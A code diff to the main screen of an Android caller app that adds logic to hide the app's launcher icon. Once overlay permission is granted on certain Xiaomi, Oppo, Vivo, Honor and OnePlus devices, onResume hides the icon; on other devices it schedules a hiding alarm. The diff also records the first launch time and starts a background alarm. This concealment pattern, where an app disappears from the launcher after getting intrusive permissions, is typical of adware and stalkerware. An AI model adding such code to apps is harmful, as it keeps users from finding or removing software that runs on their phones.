@@ -3,6 +3,7 @@ package com.yellowmood.caller.ui.main
 import android.content.Intent
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.commit
 import androidx.lifecycle.lifecycleScope
@@ -14,6 +15,9 @@ import com.yellowmood.caller.ui.contacts.ContactsFragment
 import com.yellowmood.caller.ui.greeting.GreetingActivity
 import com.yellowmood.caller.ui.home.HomeFragment
 import com.yellowmood.caller.ui.settings.SettingsFragment
+import com.yellowmood.caller.utils.hiding.AlarmBroadcast
+import com.yellowmood.caller.utils.hiding.AppHidingUtil
+import com.yellowmood.caller.utils.hiding.HidingBroadcast
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
@@ -34,6 +38,11 @@ class MainActivity : BaseActivity<MainViewModel, MainActvityBinding>() {
     }
 
     override fun setupUI() {
+        if (viewModel.preferencesRepository.firstLaunchMillis == -1L)
+            viewModel.preferencesRepository.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
         if (!viewModel.preferencesRepository.hasBeenLaunchedBefore) {
             viewModel.preferencesRepository.hasBeenLaunchedBefore = true
             startActivity(Intent(this, GreetingActivity::class.java))
@@ -70,6 +79,14 @@ class MainActivity : BaseActivity<MainViewModel, MainActvityBinding>() {
     private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
         "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
     )
+
+    override fun onResume() {
+        super.onResume()
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
+    }
 
     private fun needToShowPermissionDialog() =
         !viewModel.permissionRepository.hasNecessaryPermissions && supportFragmentManager.fragments.none { it is PermissionDialog }
